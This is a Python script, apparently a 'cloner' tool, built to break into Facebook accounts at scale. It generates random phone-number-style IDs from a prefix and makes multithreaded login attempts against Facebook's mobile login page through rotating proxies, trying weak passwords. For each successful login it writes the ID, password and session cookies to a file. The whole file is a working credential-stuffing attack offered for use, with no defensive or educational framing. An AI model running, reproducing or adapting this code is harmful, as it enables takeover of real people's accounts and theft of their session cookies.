import os, sys, time, json, random, string, platform, uuid, requests
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Ensure required modules are installed
try:
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4 > /dev/null')

# Colors
P, M, H, K, B, U, O, N = '\033[1;97m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m', '\033[0m'
warna = random.choice([P, M, H, K, B, U, O, N])

# ASCII Banner
def banner():
    os.system("clear")
    print(f"""{warna}
 /$$      /$$ /$$$$$$$        /$$$$$$$  /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$  /$$$$$$$$ 
| $$$    /$$$| $$__  $$      | $$__  $$| $$__  $$|_  $$_/| $$$ | $$ /$$__  $$| $$_____/ 
| $$$$  /$$$$| $$  \ $$      | $$  \ $$| $$  \ $$  | $$  | $$$$| $$| $$  \__/| $$       
| $$ $$/$$ $$| $$$$$$$/      | $$$$$$$/| $$$$$$$/  | $$  | $$ $$ $$| $$      | $$$$$    
| $$  $$$| $$| $$__  $$      | $$____/ | $$__  $$  | $$  | $$  $$$| $$      | $$__/    
| $$\  $ | $$| $$  \ $$      | $$      | $$  \ $$  | $$  | $$\  $$$| $$    $$| $$       
| $$ \/  | $$| $$  | $$      | $$      | $$  | $$ /$$$$$$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
|__/     |__/|__/  |__/      |__/      |__/  |__/|______/|__/  \__/ \______/ |________/ 
---------------------------------------------------------------------------------------
 AUTHOR    : MR-PRINCE  
 FACEBOOK  : THE UNSTOPPABLE LEGEND MR PRINCE HERE
 TYPE      : ADVANCED CLONER  
 VERSION   : 2.0
---------------------------------------------------------------------------------------
    """)

# Proxy System
def get_proxy():
    proxy_list = [
        "http://username:password@proxy1.com:8080",
        "http://username:password@proxy2.com:8080",
        "http://username:password@proxy3.com:8080"
    ]
    return {"http": random.choice(proxy_list)}

# Multi-threaded function
def crack(uid, password_list, mode):
    global oks, cps
    try:
        session = requests.Session()
        session.proxies.update(get_proxy())

        for password in password_list:
            response = session.post("https://mbasic.facebook.com/login/device-based/regular/login/", data={
                "email": uid,
                "pass": password,
                "login": "Log In"
            })

            if "c_user" in session.cookies.get_dict():
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                oks.append(uid)
                
                # Save successful logins
                with open("PRINCE-OK.txt", "a") as f:
                    f.write(f"{uid} | {password} | {coki}\n")
                break
            elif "checkpoint" in session.cookies.get_dict():
                cps.append(uid)
                break
            elif mode == "slow":
                time.sleep(2)  # Slow Mode Delay
    except Exception as e:
        print(f"Error: {e}")

# Function to start cloning
def start_cloning():
    banner()
    user = []
    print(f"{M}[•] Example: 019, 017, 016")
    code = input(f"{H}[•] Enter code: ")
    limit = int(input(f"{H}[•] Enter limit (e.g. 10000): "))

    print(f"{H}[1] Fast Mode")
    print(f"{H}[2] Safe Mode")
    mode_choice = input(f"{H}[•] Choose mode (1/2): ")
    mode = "fast" if mode_choice == "1" else "slow"

    for _ in range(limit):
        user.append(code + ''.join(random.choice(string.digits) for _ in range(7)))

    print(f"{H}[•] Starting Crack on {len(user)} IDs...")

    # Live count update system (Attractive Single-Line Display)
    def live_count():
        while True:
            sys.stdout.write(f"\r{H}[✓] OK: {len(oks)} | {M}CP: {len(cps)} {N}")
            sys.stdout.flush()
            time.sleep(2)

    from threading import Thread
    Thread(target=live_count, daemon=True).start()

    with ThreadPoolExecutor(max_workers=30) as executor:
        for uid in user:
            passwords = [uid[-7:], "password123", "qwerty"]
            executor.submit(crack, uid, passwords, mode)

    print(f"\n{H}[✓] Process Completed.")
    print(f"{H}[✓] OK: {len(oks)} | {M}CP: {len(cps)}")

if __name__ == "__main__":
    oks, cps = [], []
    start_cloning()
